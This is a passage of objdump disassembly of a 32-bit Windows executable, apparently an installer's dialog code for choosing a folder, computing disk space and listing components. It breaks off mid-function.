  4049a2:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  4049a9:	57                   	push   %edi
  4049aa:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4049ad:	75 11                	jne    0x4049c0
  4049af:	53                   	push   %ebx
  4049b0:	68 fb 03 00 00       	push   $0x3fb
  4049b5:	e8 cc 11 00 00       	call   0x405b86
  4049ba:	53                   	push   %ebx
  4049bb:	e8 2b 1e 00 00       	call   0x4067eb
  4049c0:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  4049c7:	8b 75 08             	mov    0x8(%ebp),%esi
  4049ca:	75 6c                	jne    0x404a38
  4049cc:	68 fb 03 00 00       	push   $0x3fb
  4049d1:	56                   	push   %esi
  4049d2:	ff 15 64 82 40 00    	call   *0x408264
  4049d8:	53                   	push   %ebx
  4049d9:	8b f8                	mov    %eax,%edi
  4049db:	e8 a8 14 00 00       	call   0x405e88
  4049e0:	85 c0                	test   %eax,%eax
  4049e2:	74 10                	je     0x4049f4
  4049e4:	53                   	push   %ebx
  4049e5:	e8 d2 14 00 00       	call   0x405ebc
  4049ea:	85 c0                	test   %eax,%eax
  4049ec:	75 06                	jne    0x4049f4
  4049ee:	53                   	push   %ebx
  4049ef:	e8 1d 14 00 00       	call   0x405e11
  4049f4:	53                   	push   %ebx
  4049f5:	57                   	push   %edi
  4049f6:	89 35 38 92 42 00    	mov    %esi,0x429238
  4049fc:	ff 15 44 82 40 00    	call   *0x408244
  404a02:	8b 45 14             	mov    0x14(%ebp),%eax
  404a05:	ff 70 34             	push   0x34(%eax)
  404a08:	6a 01                	push   $0x1
  404a0a:	56                   	push   %esi
  404a0b:	e8 82 fa ff ff       	call   0x404492
  404a10:	8b 45 14             	mov    0x14(%ebp),%eax
  404a13:	ff 70 30             	push   0x30(%eax)
  404a16:	6a 14                	push   $0x14
  404a18:	56                   	push   %esi
  404a19:	e8 74 fa ff ff       	call   0x404492
  404a1e:	57                   	push   %edi
  404a1f:	e8 a3 fa ff ff       	call   0x4044c7
  404a24:	6a 08                	push   $0x8
  404a26:	e8 06 1f 00 00       	call   0x406931
  404a2b:	85 c0                	test   %eax,%eax
  404a2d:	0f 84 91 02 00 00    	je     0x404cc4
  404a33:	6a 01                	push   $0x1
  404a35:	57                   	push   %edi
  404a36:	ff d0                	call   *%eax
  404a38:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404a3f:	0f 85 d1 00 00 00    	jne    0x404b16
  404a45:	0f b7 45 10          	movzwl 0x10(%ebp),%eax
  404a49:	3d fb 03 00 00       	cmp    $0x3fb,%eax
  404a4e:	75 18                	jne    0x404a68
  404a50:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404a53:	c1 e9 10             	shr    $0x10,%ecx
  404a56:	66 81 f9 00 03       	cmp    $0x300,%cx
  404a5b:	0f 85 63 02 00 00    	jne    0x404cc4
  404a61:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404a68:	3d e9 03 00 00       	cmp    $0x3e9,%eax
  404a6d:	0f 85 a3 00 00 00    	jne    0x404b16
  404a73:	6a 07                	push   $0x7
  404a75:	33 c0                	xor    %eax,%eax
  404a77:	59                   	pop    %ecx
  404a78:	8d 7d b8             	lea    -0x48(%ebp),%edi
  404a7b:	ff 75 f8             	push   -0x8(%ebp)
  404a7e:	f3 ab                	rep stos %eax,%es:(%edi)
  404a80:	bf 48 37 42 00       	mov    $0x423748,%edi
  404a85:	68 20 1f 42 00       	push   $0x421f20
  404a8a:	89 75 b4             	mov    %esi,-0x4c(%ebp)
  404a8d:	89 7d bc             	mov    %edi,-0x44(%ebp)
  404a90:	c7 45 c8 d9 4c 40 00 	movl   $0x404cd9,-0x38(%ebp)
  404a97:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  404a9a:	e8 da 1a 00 00       	call   0x406579
  404a9f:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404aa2:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  404aa5:	50                   	push   %eax
  404aa6:	c7 45 c4 41 00 00 00 	movl   $0x41,-0x3c(%ebp)
  404aad:	ff 15 80 81 40 00    	call   *0x408180
  404ab3:	85 c0                	test   %eax,%eax
  404ab5:	74 58                	je     0x404b0f
  404ab7:	50                   	push   %eax
  404ab8:	ff 15 a8 82 40 00    	call   *0x4082a8
  404abe:	53                   	push   %ebx
  404abf:	e8 4d 13 00 00       	call   0x405e11
  404ac4:	a1 74 a2 42 00       	mov    0x42a274,%eax
  404ac9:	8b 80 1c 01 00 00    	mov    0x11c(%eax),%eax
  404acf:	85 c0                	test   %eax,%eax
  404ad1:	74 28                	je     0x404afb
  404ad3:	81 fb 00 58 43 00    	cmp    $0x435800,%ebx
  404ad9:	75 20                	jne    0x404afb
  404adb:	50                   	push   %eax
  404adc:	6a 00                	push   $0x0
  404ade:	e8 96 1a 00 00       	call   0x406579
  404ae3:	57                   	push   %edi
  404ae4:	bf 00 82 42 00       	mov    $0x428200,%edi
  404ae9:	57                   	push   %edi
  404aea:	ff 15 28 81 40 00    	call   *0x408128
  404af0:	85 c0                	test   %eax,%eax
  404af2:	74 07                	je     0x404afb
  404af4:	57                   	push   %edi
  404af5:	53                   	push   %ebx
  404af6:	e8 5d 1a 00 00       	call   0x406558
  404afb:	ff 05 38 37 42 00    	incl   0x423738
  404b01:	53                   	push   %ebx
  404b02:	68 fb 03 00 00       	push   $0x3fb
  404b07:	56                   	push   %esi
  404b08:	e8 73 10 00 00       	call   0x405b80
  404b0d:	eb 07                	jmp    0x404b16
  404b0f:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404b16:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  404b1d:	74 0d                	je     0x404b2c
  404b1f:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  404b26:	0f 85 98 01 00 00    	jne    0x404cc4
  404b2c:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404b30:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  404b34:	53                   	push   %ebx
  404b35:	68 fb 03 00 00       	push   $0x3fb
  404b3a:	e8 47 10 00 00       	call   0x405b86
  404b3f:	53                   	push   %ebx
  404b40:	e8 d4 13 00 00       	call   0x405f19
  404b45:	85 c0                	test   %eax,%eax
  404b47:	75 07                	jne    0x404b50
  404b49:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  404b50:	be 18 17 42 00       	mov    $0x421718,%esi
  404b55:	53                   	push   %ebx
  404b56:	56                   	push   %esi
  404b57:	e8 e0 19 00 00       	call   0x40653c
  404b5c:	6a 01                	push   $0x1
  404b5e:	e8 ce 1d 00 00       	call   0x406931
  404b63:	85 c0                	test   %eax,%eax
  404b65:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404b68:	74 3a                	je     0x404ba4
  404b6a:	33 c0                	xor    %eax,%eax
  404b6c:	33 ff                	xor    %edi,%edi
  404b6e:	3b c6                	cmp    %esi,%eax
  404b70:	74 32                	je     0x404ba4
  404b72:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404b75:	50                   	push   %eax
  404b76:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404b79:	50                   	push   %eax
  404b7a:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404b7d:	50                   	push   %eax
  404b7e:	56                   	push   %esi
  404b7f:	ff 55 f4             	call   *-0xc(%ebp)
  404b82:	85 c0                	test   %eax,%eax
  404b84:	75 76                	jne    0x404bfc
  404b86:	85 ff                	test   %edi,%edi
  404b88:	74 03                	je     0x404b8d
  404b8a:	66 21 07             	and    %ax,(%edi)
  404b8d:	56                   	push   %esi
  404b8e:	e8 ca 12 00 00       	call   0x405e5d
  404b93:	8b f8                	mov    %eax,%edi
  404b95:	66 83 27 00          	andw   $0x0,(%edi)
  404b99:	4f                   	dec    %edi
  404b9a:	4f                   	dec    %edi
  404b9b:	3b fe                	cmp    %esi,%edi
  404b9d:	66 c7 07 5c 00       	movw   $0x5c,(%edi)
  404ba2:	75 ce                	jne    0x404b72
  404ba4:	53                   	push   %ebx
  404ba5:	56                   	push   %esi
  404ba6:	e8 91 19 00 00       	call   0x40653c
  404bab:	56                   	push   %esi
  404bac:	e8 0b 13 00 00       	call   0x405ebc
  404bb1:	33 ff                	xor    %edi,%edi
  404bb3:	3b c7                	cmp    %edi,%eax
  404bb5:	74 03                	je     0x404bba
  404bb7:	66 89 38             	mov    %di,(%eax)
  404bba:	8d 45 e0             	lea    -0x20(%ebp),%eax
  404bbd:	50                   	push   %eax
  404bbe:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404bc1:	50                   	push   %eax
  404bc2:	8d 45 ec             	lea    -0x14(%ebp),%eax
  404bc5:	50                   	push   %eax
  404bc6:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404bc9:	50                   	push   %eax
  404bca:	56                   	push   %esi
  404bcb:	ff 15 b8 80 40 00    	call   *0x4080b8
  404bd1:	85 c0                	test   %eax,%eax
  404bd3:	74 43                	je     0x404c18
  404bd5:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404bd8:	be 00 04 00 00       	mov    $0x400,%esi
  404bdd:	0f af 45 ec          	imul   -0x14(%ebp),%eax
  404be1:	56                   	push   %esi
  404be2:	ff 75 f4             	push   -0xc(%ebp)
  404be5:	50                   	push   %eax
  404be6:	ff 15 fc 80 40 00    	call   *0x4080fc
  404bec:	99                   	cltd
  404bed:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404bf0:	89 55 d8             	mov    %edx,-0x28(%ebp)
  404bf3:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404bfa:	eb 21                	jmp    0x404c1d
  404bfc:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  404bff:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  404c02:	0f ac c8 0a          	shrd   $0xa,%ecx,%eax
  404c06:	c1 e9 0a             	shr    $0xa,%ecx
  404c09:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404c0c:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  404c0f:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404c16:	33 ff                	xor    %edi,%edi
  404c18:	be 00 04 00 00       	mov    $0x400,%esi
  404c1d:	6a 05                	push   $0x5
  404c1f:	e8 fc 01 00 00       	call   0x404e20
  404c24:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  404c27:	74 19                	je     0x404c42
  404c29:	8b 55 d8             	mov    -0x28(%ebp),%edx
  404c2c:	33 c9                	xor    %ecx,%ecx
  404c2e:	3b d1                	cmp    %ecx,%edx
  404c30:	77 10                	ja     0x404c42
  404c32:	72 07                	jb     0x404c3b
  404c34:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  404c37:	3b c8                	cmp    %eax,%ecx
  404c39:	73 07                	jae    0x404c42
  404c3b:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  404c42:	8b 0d 3c 92 42 00    	mov    0x42923c,%ecx
  404c48:	39 79 10             	cmp    %edi,0x10(%ecx)
  404c4b:	74 30                	je     0x404c7d
  404c4d:	50                   	push   %eax
  404c4e:	6a fb                	push   $0xfffffffb
  404c50:	68 ff 03 00 00       	push   $0x3ff
  404c55:	e8 ae 01 00 00       	call   0x404e08
  404c5a:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  404c5d:	74 10                	je     0x404c6f
  404c5f:	ff 75 d8             	push   -0x28(%ebp)
  404c62:	ff 75 d4             	push   -0x2c(%ebp)
  404c65:	6a fc                	push   $0xfffffffc
  404c67:	56                   	push   %esi
  404c68:	e8 d2 00 00 00       	call   0x404d3f
  404c6d:	eb 0e                	jmp    0x404c7d
  404c6f:	68 08 17 42 00       	push   $0x421708
  404c74:	56                   	push   %esi
  404c75:	ff 75 08             	push   0x8(%ebp)
  404c78:	e8 03 0f 00 00       	call   0x405b80
  404c7d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404c80:	3b c7                	cmp    %edi,%eax
  404c82:	a3 24 a3 42 00       	mov    %eax,0x42a324
  404c87:	75 0a                	jne    0x404c93
  404c89:	6a 07                	push   $0x7
  404c8b:	e8 7b c7 ff ff       	call   0x40140b
  404c90:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404c93:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404c96:	85 70 14             	test   %esi,0x14(%eax)
  404c99:	74 03                	je     0x404c9e
  404c9b:	89 7d fc             	mov    %edi,-0x4(%ebp)
  404c9e:	33 c0                	xor    %eax,%eax
  404ca0:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  404ca3:	0f 94 c0             	sete   %al
  404ca6:	50                   	push   %eax
  404ca7:	e8 08 f8 ff ff       	call   0x4044b4
  404cac:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  404caf:	75 0d                	jne    0x404cbe
  404cb1:	39 3d 38 37 42 00    	cmp    %edi,0x423738
  404cb7:	75 05                	jne    0x404cbe
  404cb9:	e8 1e fc ff ff       	call   0x4048dc
  404cbe:	89 3d 38 37 42 00    	mov    %edi,0x423738
  404cc4:	ff 75 14             	push   0x14(%ebp)
  404cc7:	ff 75 10             	push   0x10(%ebp)
  404cca:	ff 75 0c             	push   0xc(%ebp)
  404ccd:	e8 27 f8 ff ff       	call   0x4044f9
  404cd2:	5f                   	pop    %edi
  404cd3:	5e                   	pop    %esi
  404cd4:	5b                   	pop    %ebx
  404cd5:	c9                   	leave
  404cd6:	c2 10 00             	ret    $0x10
  404cd9:	55                   	push   %ebp
  404cda:	8b ec                	mov    %esp,%ebp
  404cdc:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  404ce0:	56                   	push   %esi
  404ce1:	8b 35 80 82 40 00    	mov    0x408280,%esi
  404ce7:	75 1c                	jne    0x404d05
  404ce9:	ff 75 14             	push   0x14(%ebp)
  404cec:	68 fb 03 00 00       	push   $0x3fb
  404cf1:	e8 90 0e 00 00       	call   0x405b86
  404cf6:	ff 75 14             	push   0x14(%ebp)
  404cf9:	6a 01                	push   $0x1
  404cfb:	68 67 04 00 00       	push   $0x467
  404d00:	ff 75 08             	push   0x8(%ebp)
  404d03:	ff d6                	call   *%esi
  404d05:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  404d09:	75 2d                	jne    0x404d38
  404d0b:	ff 75 14             	push   0x14(%ebp)
  404d0e:	ff 75 10             	push   0x10(%ebp)
  404d11:	ff 15 84 81 40 00    	call   *0x408184
  404d17:	85 c0                	test   %eax,%eax
  404d19:	74 0e                	je     0x404d29
  404d1b:	6a 07                	push   $0x7
  404d1d:	e8 e9 c6 ff ff       	call   0x40140b
  404d22:	85 c0                	test   %eax,%eax
  404d24:	75 03                	jne    0x404d29
  404d26:	40                   	inc    %eax
  404d27:	eb 02                	jmp    0x404d2b
  404d29:	33 c0                	xor    %eax,%eax
  404d2b:	50                   	push   %eax
  404d2c:	6a 00                	push   $0x0
  404d2e:	68 65 04 00 00       	push   $0x465
  404d33:	ff 75 08             	push   0x8(%ebp)
  404d36:	ff d6                	call   *%esi
  404d38:	33 c0                	xor    %eax,%eax
  404d3a:	5e                   	pop    %esi
  404d3b:	5d                   	pop    %ebp
  404d3c:	c2 10 00             	ret    $0x10
  404d3f:	55                   	push   %ebp
  404d40:	8b ec                	mov    %esp,%ebp
  404d42:	81 ec 80 00 00 00    	sub    $0x80,%esp
  404d48:	8b 45 14             	mov    0x14(%ebp),%eax
  404d4b:	53                   	push   %ebx
  404d4c:	56                   	push   %esi
  404d4d:	8b 75 10             	mov    0x10(%ebp),%esi
  404d50:	57                   	push   %edi
  404d51:	6a dc                	push   $0xffffffdc
  404d53:	85 c0                	test   %eax,%eax
  404d55:	5b                   	pop    %ebx
  404d56:	74 0b                	je     0x404d63
  404d58:	0f ac c6 14          	shrd   $0x14,%eax,%esi
  404d5c:	c1 e8 14             	shr    $0x14,%eax
  404d5f:	33 ff                	xor    %edi,%edi
  404d61:	eb 4e                	jmp    0x404db1
  404d63:	6a 14                	push   $0x14
  404d65:	81 fe 00 00 10 00    	cmp    $0x100000,%esi
  404d6b:	59                   	pop    %ecx
  404d6c:	8b c6                	mov    %esi,%eax
  404d6e:	73 06                	jae    0x404d76
  404d70:	6a 0a                	push   $0xa
  404d72:	59                   	pop    %ecx
  404d73:	6a dd                	push   $0xffffffdd
  404d75:	5b                   	pop    %ebx
  404d76:	81 fe 00 04 00 00    	cmp    $0x400,%esi
  404d7c:	73 05                	jae    0x404d83
  404d7e:	6a de                	push   $0xffffffde
  404d80:	33 c9                	xor    %ecx,%ecx
  404d82:	5b                   	pop    %ebx
  404d83:	81 fe 33 33 ff ff    	cmp    $0xffff3333,%esi
  404d89:	73 0d                	jae    0x404d98
  404d8b:	33 c0                	xor    %eax,%eax
  404d8d:	6a 14                	push   $0x14
  404d8f:	40                   	inc    %eax
  404d90:	5f                   	pop    %edi
  404d91:	d3 e0                	shl    %cl,%eax
  404d93:	99                   	cltd
  404d94:	f7 ff                	idiv   %edi
  404d96:	03 c6                	add    %esi,%eax
  404d98:	8b f0                	mov    %eax,%esi
  404d9a:	25 ff ff ff 00       	and    $0xffffff,%eax
  404d9f:	6a 0a                	push   $0xa
  404da1:	33 d2                	xor    %edx,%edx
  404da3:	8d 04 80             	lea    (%eax,%eax,4),%eax
  404da6:	03 c0                	add    %eax,%eax
  404da8:	d3 e8                	shr    %cl,%eax
  404daa:	d3 ee                	shr    %cl,%esi
  404dac:	59                   	pop    %ecx
  404dad:	f7 f1                	div    %ecx
  404daf:	8b fa                	mov    %edx,%edi
  404db1:	8d 45 c0             	lea    -0x40(%ebp),%eax
  404db4:	6a df                	push   $0xffffffdf
  404db6:	50                   	push   %eax
  404db7:	e8 bd 17 00 00       	call   0x406579
  404dbc:	50                   	push   %eax
  404dbd:	8d 45 80             	lea    -0x80(%ebp),%eax
  404dc0:	53                   	push   %ebx
  404dc1:	50                   	push   %eax
  404dc2:	e8 b2 17 00 00       	call   0x406579
  404dc7:	50                   	push   %eax
  404dc8:	57                   	push   %edi
  404dc9:	56                   	push   %esi
  404dca:	68 d4 a3 40 00       	push   $0x40a3d4
  404dcf:	ff 75 0c             	push   0xc(%ebp)
  404dd2:	be 48 37 42 00       	mov    $0x423748,%esi
  404dd7:	56                   	push   %esi
  404dd8:	e8 9c 17 00 00       	call   0x406579
  404ddd:	56                   	push   %esi
  404dde:	8b f8                	mov    %eax,%edi
  404de0:	e8 6d 17 00 00       	call   0x406552
  404de5:	8d 04 47             	lea    (%edi,%eax,2),%eax
  404de8:	50                   	push   %eax
  404de9:	ff 15 54 82 40 00    	call   *0x408254
  404def:	83 c4 18             	add    $0x18,%esp
  404df2:	56                   	push   %esi
  404df3:	ff 75 08             	push   0x8(%ebp)
  404df6:	ff 35 38 92 42 00    	push   0x429238
  404dfc:	e8 7f 0d 00 00       	call   0x405b80
  404e01:	5f                   	pop    %edi
  404e02:	5e                   	pop    %esi
  404e03:	5b                   	pop    %ebx
  404e04:	c9                   	leave
  404e05:	c2 10 00             	ret    $0x10
  404e08:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404e0c:	33 c9                	xor    %ecx,%ecx
  404e0e:	51                   	push   %ecx
  404e0f:	50                   	push   %eax
  404e10:	ff 74 24 10          	push   0x10(%esp)
  404e14:	ff 74 24 10          	push   0x10(%esp)
  404e18:	e8 22 ff ff ff       	call   0x404d3f
  404e1d:	c2 0c 00             	ret    $0xc
  404e20:	8b 15 ac a2 42 00    	mov    0x42a2ac,%edx
  404e26:	8b 0d a8 a2 42 00    	mov    0x42a2a8,%ecx
  404e2c:	33 c0                	xor    %eax,%eax
  404e2e:	85 d2                	test   %edx,%edx
  404e30:	74 18                	je     0x404e4a
  404e32:	56                   	push   %esi
  404e33:	f6 41 08 01          	testb  $0x1,0x8(%ecx)
  404e37:	74 07                	je     0x404e40
  404e39:	8b 74 24 08          	mov    0x8(%esp),%esi
  404e3d:	03 04 b1             	add    (%ecx,%esi,4),%eax
  404e40:	81 c1 18 08 00 00    	add    $0x818,%ecx
  404e46:	4a                   	dec    %edx
  404e47:	75 ea                	jne    0x404e33
  404e49:	5e                   	pop    %esi
  404e4a:	c2 04 00             	ret    $0x4
  404e4d:	55                   	push   %ebp
  404e4e:	8b ec                	mov    %esp,%ebp
  404e50:	83 ec 38             	sub    $0x38,%esp
  404e53:	56                   	push   %esi
  404e54:	8b 35 80 82 40 00    	mov    0x408280,%esi
  404e5a:	57                   	push   %edi
  404e5b:	8b 7d 08             	mov    0x8(%ebp),%edi
  404e5e:	6a 00                	push   $0x0
  404e60:	6a 09                	push   $0x9
  404e62:	68 0a 11 00 00       	push   $0x110a
  404e67:	57                   	push   %edi
  404e68:	ff d6                	call   *%esi
  404e6a:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  404e6e:	74 3c                	je     0x404eac
  404e70:	ff 15 e4 81 40 00    	call   *0x4081e4
  404e76:	0f bf c8             	movswl %ax,%ecx
  404e79:	c1 e8 10             	shr    $0x10,%eax
  404e7c:	0f bf c0             	movswl %ax,%eax
  404e7f:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404e82:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404e85:	50                   	push   %eax
  404e86:	57                   	push   %edi
  404e87:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  404e8a:	ff 15 14 82 40 00    	call   *0x408214
  404e90:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404e93:	50                   	push   %eax
  404e94:	6a 00                	push   $0x0
  404e96:	68 11 11 00 00       	push   $0x1111
  404e9b:	57                   	push   %edi
  404e9c:	ff d6                	call   *%esi
  404e9e:	f6 45 f8 66          	testb  $0x66,-0x8(%ebp)
  404ea2:	75 05                	jne    0x404ea9
  404ea4:	83 c8 ff             	or     $0xffffffff,%eax
  404ea7:	eb 1e                	jmp    0x404ec7
  404ea9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404eac:	89 45 cc             	mov    %eax,-0x34(%ebp)
  404eaf:	8d 45 c8             	lea    -0x38(%ebp),%eax
  404eb2:	50                   	push   %eax
  404eb3:	6a 00                	push   $0x0
  404eb5:	68 3e 11 00 00       	push   $0x113e
  404eba:	57                   	push   %edi
  404ebb:	c7 45 c8 04 00 00 00 	movl   $0x4,-0x38(%ebp)
  404ec2:	ff d6                	call   *%esi
  404ec4:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404ec7:	5f                   	pop    %edi
  404ec8:	5e                   	pop    %esi
  404ec9:	c9                   	leave
  404eca:	c2 08 00             	ret    $0x8
  404ecd:	56                   	push   %esi
  404ece:	57                   	push   %edi
  404ecf:	be 00 b0 42 00       	mov    $0x42b000,%esi
  404ed4:	bf 48 37 42 00       	mov    $0x423748,%edi
  404ed9:	56                   	push   %esi
  404eda:	57                   	push   %edi
  404edb:	e8 5c 16 00 00       	call   0x40653c
  404ee0:	ff 74 24 10          	push   0x10(%esp)
  404ee4:	56                   	push   %esi
  404ee5:	e8 99 15 00 00       	call   0x406483
  404eea:	ff 74 24 0c          	push   0xc(%esp)
  404eee:	e8 18 c5 ff ff       	call   0x40140b
  404ef3:	57                   	push   %edi
  404ef4:	56                   	push   %esi
  404ef5:	e8 42 16 00 00       	call   0x40653c
  404efa:	5f                   	pop    %edi
  404efb:	5e                   	pop    %esi
  404efc:	c2 08 00             	ret    $0x8
  404eff:	55                   	push   %ebp
  404f00:	8b ec                	mov    %esp,%ebp
  404f02:	83 ec 54             	sub    $0x54,%esp
  404f05:	53                   	push   %ebx
  404f06:	56                   	push   %esi
  404f07:	8b 35 64 82 40 00    	mov    0x408264,%esi
  404f0d:	57                   	push   %edi
  404f0e:	68 f9 03 00 00       	push   $0x3f9
  404f13:	ff 75 08             	push   0x8(%ebp)
  404f16:	ff d6                	call   *%esi
  404f18:	68 08 04 00 00       	push   $0x408
  404f1d:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404f20:	ff 75 08             	push   0x8(%ebp)
  404f23:	ff d6                	call   *%esi
  404f25:	8b 1d a8 a2 42 00    	mov    0x42a2a8,%ebx
  404f2b:	8b 35 80 82 40 00    	mov    0x408280,%esi
  404f31:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404f34:	a1 74 a2 42 00       	mov    0x42a274,%eax
  404f39:	05 94 00 00 00       	add    $0x94,%eax
  404f3e:	33 ff                	xor    %edi,%edi
  404f40:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404f47:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  404f4a:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404f4d:	0f 85 2d 02 00 00    	jne    0x405180
  404f53:	8b 45 08             	mov    0x8(%ebp),%eax
  404f56:	6a 02                	push   $0x2
  404f58:	a3 e0 a2 42 00       	mov    %eax,0x42a2e0
  404f5d:	a1 ac a2 42 00       	mov    0x42a2ac,%eax
  404f62:	5b                   	pop    %ebx
  404f63:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  404f66:	c1 e0 02             	shl    $0x2,%eax
  404f69:	50                   	push   %eax
  404f6a:	6a 40                	push   $0x40
  404f6c:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  404f6f:	ff 15 38 81 40 00    	call   *0x408138
  404f75:	57                   	push   %edi
  404f76:	57                   	push   %edi
  404f77:	57                   	push   %edi
  404f78:	57                   	push   %edi
  404f79:	6a 6e                	push   $0x6e
  404f7b:	a3 40 37 42 00       	mov    %eax,0x423740
  404f80:	ff 35 60 a2 42 00    	push   0x42a260
  404f86:	ff 15 6c 82 40 00    	call   *0x40826c
  404f8c:	83 0d 34 37 42 00 ff 	orl    $0xffffffff,0x423734
  404f93:	68 18 55 40 00       	push   $0x405518
  404f98:	6a fc                	push   $0xfffffffc
  404f9a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404f9d:	ff 75 fc             	push   -0x4(%ebp)
  404fa0:	ff 15 68 82 40 00    	call   *0x408268
  404fa6:	57                   	push   %edi
  404fa7:	6a 06                	push   $0x6
  404fa9:	6a 21                	push   $0x21
  404fab:	6a 10                	push   $0x10
  404fad:	6a 10                	push   $0x10
  404faf:	a3 3c 37 42 00       	mov    %eax,0x42373c
  404fb4:	ff 15 3c 80 40 00    	call   *0x40803c
  404fba:	68 ff 00 ff 00       	push   $0xff00ff
  404fbf:	a3 2c 37 42 00       	mov    %eax,0x42372c
  404fc4:	ff 75 f4             	push   -0xc(%ebp)
  404fc7:	50                   	push   %eax
  404fc8:	ff 15 44 80 40 00    	call   *0x408044
  404fce:	ff 35 2c 37 42 00    	push   0x42372c
  404fd4:	53                   	push   %ebx
  404fd5:	68 09 11 00 00       	push   $0x1109
  404fda:	ff 75 fc             	push   -0x4(%ebp)
  404fdd:	ff d6                	call   *%esi
  404fdf:	57                   	push   %edi
  404fe0:	57                   	push   %edi
  404fe1:	68 1c 11 00 00       	push   $0x111c
  404fe6:	ff 75 fc             	push   -0x4(%ebp)
  404fe9:	ff d6                	call   *%esi
  404feb:	83 f8 10             	cmp    $0x10,%eax
  404fee:	7d 0d                	jge    0x404ffd
  404ff0:	57                   	push   %edi
  404ff1:	6a 10                	push   $0x10
  404ff3:	68 1b 11 00 00       	push   $0x111b
  404ff8:	ff 75 fc             	push   -0x4(%ebp)
  404ffb:	ff d6                	call   *%esi
  404ffd:	ff 75 f4             	push   -0xc(%ebp)
  405000:	ff 15 60 80 40 00    	call   *0x408060
  405006:	33 db                	xor    %ebx,%ebx
  405008:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40500b:	8b 04 98             	mov    (%eax,%ebx,4),%eax
  40500e:	3b c7                	cmp    %edi,%eax
  405010:	74 27                	je     0x405039
  405012:	83 fb 20             	cmp    $0x20,%ebx
  405015:	74 03                	je     0x40501a
  405017:	89 7d f0             	mov    %edi,-0x10(%ebp)
  40501a:	50                   	push   %eax
  40501b:	57                   	push   %edi
  40501c:	e8 58 15 00 00       	call   0x406579
  405021:	50                   	push   %eax
  405022:	57                   	push   %edi
  405023:	68 43 01 00 00       	push   $0x143
  405028:	ff 75 f8             	push   -0x8(%ebp)
  40502b:	ff d6                	call   *%esi
  40502d:	53                   	push   %ebx
  40502e:	50                   	push   %eax
  40502f:	68 51 01 00 00       	push   $0x151
  405034:	ff 75 f8             	push   -0x8(%ebp)
  405037:	ff d6                	call   *%esi
  405039:	43                   	inc    %ebx
  40503a:	83 fb 21             	cmp    $0x21,%ebx
  40503d:	7c c9                	jl     0x405008
  40503f:	8b 5d 14             	mov    0x14(%ebp),%ebx
  405042:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405045:	ff 74 83 30          	push   0x30(%ebx,%eax,4)
  405049:	6a 15                	push   $0x15
  40504b:	ff 75 08             	push   0x8(%ebp)
  40504e:	e8 3f f4 ff ff       	call   0x404492
  405053:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405056:	ff 74 83 34          	push   0x34(%ebx,%eax,4)
  40505a:	6a 16                	push   $0x16
  40505c:	ff 75 08             	push   0x8(%ebp)
  40505f:	e8 2e f4 ff ff       	call   0x404492
  405064:	33 db                	xor    %ebx,%ebx
  405066:	39 3d ac a2 42 00    	cmp    %edi,0x42a2ac
  40506c:	89 7d f4             	mov    %edi,-0xc(%ebp)
  40506f:	0f 8e ca 00 00 00    	jle    0x40513f
  405075:	8b 45 e0             	mov    -0x20(%ebp),%eax
  405078:	8d 50 08             	lea    0x8(%eax),%edx
  40507b:	89 55 e8             	mov    %edx,-0x18(%ebp)
  40507e:	8d 42 10             	lea    0x10(%edx),%eax
  405081:	66 39 38             	cmp    %di,(%eax)
